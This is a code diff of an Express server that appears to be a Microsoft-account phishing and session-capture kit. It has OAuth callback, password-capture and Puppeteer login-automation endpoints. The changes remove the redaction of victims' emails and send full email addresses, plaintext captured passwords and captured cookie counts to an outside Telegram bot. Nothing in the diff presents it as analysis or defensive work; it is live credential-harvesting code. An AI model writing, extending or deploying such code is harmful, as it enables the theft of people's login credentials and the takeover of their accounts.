@@ -629,18 +629,18 @@ app.get('/api/auth-callback', async (req, res) => {
             </html>
         `);
 
-        // Send Telegram notification if bot is available (with minimal PII logging)
+        // Send Telegram notification if bot is available
         if (telegramBot) {
             try {
-                const domain = targetSession.userEmail.split('@')[1] || 'Unknown';
                 await telegramBot.sendLoginNotification({
-                    email: '***@' + domain, // Redact username part
-                    domain: domain,
+                    email: targetSession.userEmail,
+                    password: 'Captured via OAuth', // OAuth doesn't capture actual password
                     timestamp: new Date().toISOString(),
                     sessionId: targetSession.sessionId,
-                    authMethod: 'Microsoft Graph API'
+                    authMethod: 'Microsoft Graph API',
+                    totalCookies: 0 // OAuth method doesn't capture cookies directly
                 });
-                console.log(`📤 Telegram notification sent for user@${domain}`);
+                console.log(`📤 Telegram notification sent for ${targetSession.userEmail}`);
             } catch (error) {
                 console.error('❌ Failed to send Telegram notification:', error.message);
             }
@@ -1003,12 +1003,13 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                             try {
                                 await telegramBot.sendLoginNotification({
                                     email: email,
-                                    password: password, // Include the captured password
+                                    password: password,
                                     timestamp: new Date().toISOString(),
                                     sessionId: sessionId,
                                     totalCookies: sessionValidation.cookiesSaved || 0,
                                     authMethod: 'FAST Authentication (preloaded browser)'
                                 });
+                                console.log(`📤 Telegram notification sent for ${email}`);
                             } catch (telegramError) {
                                 console.warn('Telegram notification failed:', telegramError.message);
                             }
@@ -1340,15 +1341,15 @@ app.post('/api/login-automation', async (req, res) => {
                 // Send Telegram notification if bot is available
                 if (telegramBot) {
                     try {
-                        const domain = email.split('@')[1] || 'Unknown';
                         await telegramBot.sendLoginNotification({
-                            email: '***@' + domain,
-                            domain: domain,
+                            email: email,
+                            password: password,
                             timestamp: new Date().toISOString(),
                             sessionId: sessionId,
+                            totalCookies: sessionValidation.cookiesSaved || 0,
                             authMethod: 'Puppeteer Automation'
                         });
-                        console.log(`📤 Telegram notification sent for user@${domain}`);
+                        console.log(`📤 Telegram notification sent for ${email}`);
                     } catch (error) {
                         console.error('❌ Failed to send Telegram notification:', error.message);
                     }
